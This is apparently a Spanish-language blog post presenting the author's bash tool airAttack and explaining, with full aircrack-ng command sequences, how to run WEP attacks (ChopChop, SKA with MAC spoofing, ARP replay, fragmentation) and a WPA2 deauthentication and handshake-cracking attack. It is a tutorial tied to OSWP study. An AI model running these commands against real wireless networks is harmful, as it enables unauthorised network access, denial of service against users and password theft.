---
layout: single
title: airAttack
excerpt: "En este artículo, explico la utilidad de la herramienta airAttack. También dejo reflejado cada ataque, la finalidad de cada ataque y como ejecutarlo. Todos los ataques de esta herramienta se ejecutan gracias a la suite aircrack-ng. La herramienta fue publicada en github el día 27/06/2021, pocos días después de aprobar el OSWP como primera release."
date: 2021-08-31
classes: wide
header:
  teaser: /assets/images/airAttack/airAttack.jpg
  teaser_home_page: true
categories:
  - script
tags:
  - shell
  - wireless
  - aircrack-ng
  - wireless_pentesting
---

![](/assets/images/airAttack/AIR-ATTACK-Header.jpg)

**airAttack** es una herramienta ofensiva para automatizar los ataques a redes inalámbricas escrita en bash. Esta herramienta será mejorada por mi próximamente para para optimizar determinadas porciones de código. Los ataques de denegación de servicio así como nuevas funciones serán añadidas. Este programa lo escribí cuando estaba estudiando para el OSWP (Offensive Security Wireless Professional).

En este artículo, explicaré cada ataque que puede utilizarse en airAttack, la finalidad y como ejecutarlo manualmente.

La herramienta se puede descargar en:

* [https://github.com/e1abrador/airAttack](https://github.com/e1abrador/airAttack)

<h2> Ataques WEP </h2>

Antes de empezar con los ataques WEP, es importante recalcar que todos estos ataques están enfocados obtener el máximo número de IVS para poder crackear la contraseña, a diferéncia de los ataques WPA2, cuya prioridad es obtener el hash de la red para poder posteriormente crackearlo.

**IVS:** Los IVS, también conocidos como "Archivos de Vector de inicialización", se clasifican como archivos de datos que contienen vectores de  inicialización que son necesarios para la generación de los datos cifrados en la red.

<h3><u>Chop</u> <u>Chop</u> <u>Attack</u></h3>
El ataque de **Chop Chop** consiste en coger un byte de datos de un paquete encriptado WEP, substituyendo los valores de los bytes del paquete y recalculando la suma de verificación del encriptado. Los paquetes ya modificados se envían al router, el router simplemente los descarta hasta que el atacante finalmente logra sustituir una suma de verificación válida.

```bash
airodump-ng -c canal_de_ap --bssid mac_de_ap -w captura wlan0
aireplay-ng -1 6000 -o 1 -q 10 -a mac_de_ap -h mac_tarjeta wlan0
aireplay-ng -4 -a mac_de_ap -h mac_tarjeta wlan0
packetforge-ng -0 -a mac_de_ap -h mac_tarjeta -l 192.168.1.2 -k 192.168.1.255 -y *.xor -w ataque_chopchop
aireplay-ng -2 -r ataque_chopchop wlan0
aircrack-ng captura-01.cap
```

**Nota:** Es importante dejar un pequeño espacio de tiempo entre comando y comando y esperar a que cada comando se inyecte correctamente en el router.

<h3><u>SKA</u></h3>
El ataque **SKA**, también conocido como "Broken Shared Key Authentication" consiste en copiar la dirección MAC de un cliente ya conectado a la red en nuestra própia tarjeta de red y generar un ataque de falsa autenticación con nuestra nueva MAC (MAC copiada del cliente previamente autenticado), el objetivo de autenticar nuestra MAC es generar paquetes ARP en la red.

```bash
airodump-ng --bssid mac_de_ap -c canal_de_ap wlan0 -> Por ahora no es necesario empezar a capturar paquetes.
```
Cuando tenemos el punto de acceso localizado y la MAC localizada, dejaremos de ver el tráfico de la red con airodump y procederemos a cambiar la MAC de nuestra tarjeta de red, con el siguiente one-liner se puede cambiar.

```bash
ifconfig wlan0 down &> /dev/null && macchanger --mac mac_de_cliente wlan0 &> /dev/null && ifconfig wlan0 up &> /dev/null
```

**Nota**: Puede que sea necesario ejecutar por segunda vez el one-liner para que se cambie correctamente.

```bash
airodump-ng -w captura --bssid mac_de_ap -c canal_de_ap wlan0
aireplay-ng -3 -b mac_de_ap -h mac_tarjeta wlan0
aireplay-ng -0 1 -e essid_de_ap -a mac_de_ap -h mac_de_ap wlan0
aircrack-ng captura-01.cap
```

<h3><u>ARP</u> <u>Request</u> <u>Replay</u> <u>Attack</u></h3>

El ataque de **ARP Request Replay Attack** consiste en inyectar nuestra MAC en el router víctima, posteriormente se genera un ataque de denegación de servicio sobre uno de los clientes conectados (si este ataque se lanza contra todos, se obtendrán mas IVS, haciendo que la probabilidad de crackear la clave será más alta) y, cuando dichos clientes se vuelvan a conectar a la red, se genererarán de forma automática paquetes ARP, lo que generará IVS.

```bash
airodump-ng -w captura --bssid mac_de_ap -c canal_de_ap wlan0
aireplay-ng -3 -x 1000 -n 1000 -b mac_de_ap -h mac_de_tarjeta wlan0
aireplay-ng -0 5 -a mac_de_ap -h mac_de_cliente_conectado wlan0
aircrack-ng captura-01.cap
```

<h3><u>Fragmentation</u> <u>Attack</u></h3>

Este ataque necesita que 1 único paquete de datos sea capturado por airodump. Posteriormente, se genera un nuevo paquete modificado con la dirección MAC de nuestra tarjeta de red y se inyecta el paquete modificado por el atacante en el punto de acceso objetivo. De esta forma, se generarán paquetes ARP y, en consecuéncia, los IVS necesários para crackear la clave.

```bash
airodump-ng -w captura --bssid mac_de_ap -c canal_de_ap wlan0
aireplay-ng -1 6000 -o 1 -q 10 -a mac_de_ap -h mac_tarjeta wlan0 -> es muy recomendable dejar el cliente inyectado, ya que facilitará la obtención del paquete de datos.
packetforge-ng -0 -a mac_de_ap -h mac_de_tarjeta -l 192.168.1.2 -k 192.168.1.255 -y *.xor -w fragmentation_attack
aireplay-ng -2 -r fragmentation_attack wlan0
aircrack-ng captura-01.cap
```

<h2> Ataques WPA2 </h2>

El protocolo WPA2 hace años que empezó a monopolizarse en los routers instalados por las compañías telefónicas. Aun que si que es verdad que el protocolo WEP no se suele utilizar, aún hay routers que lo implementan, ya que hay dispositivos (si són de última generación suele no pasar) que únicamente aceptan el procolo WEP.

El objetivo en estas redes es obtener un hash para poder crackearlo mediante el uso de un diccionario de contraseñas.

<h3><u>Ataque</u> <u>de</u> <u>deautenticación</u></h3>

El **ataque de deautenticación** ataque es un ataque de denegación de servicio, el objetivo es provocar que la víctima se reconecte al punto de acceso, en el momento que un dispositivo se conecta al router, se genera un packete handshake, el cual contiene la contraseña hasheada de la red inalámbrica.

```bash
airodump-ng -c canal_de_ap --bssid mac_de_ap -w captura wlan0
aireplay-ng -0 15 -a mac_de_ap -h mac_de_cliente wlan0 -> se utiliza para deautenticar a un solo cliente de la red
aireplay-ng -0 15 -a mac_de_ap -c FF:FF:FF:FF:FF:FF  wlan0 -> se utiliza para deautenticar a todos los clientes de la red
aircrack-ng -J miCaptura captura.cap
hccap2john miCaptura.hccap > hash
john --wordlist=rockyou.txt hash
```
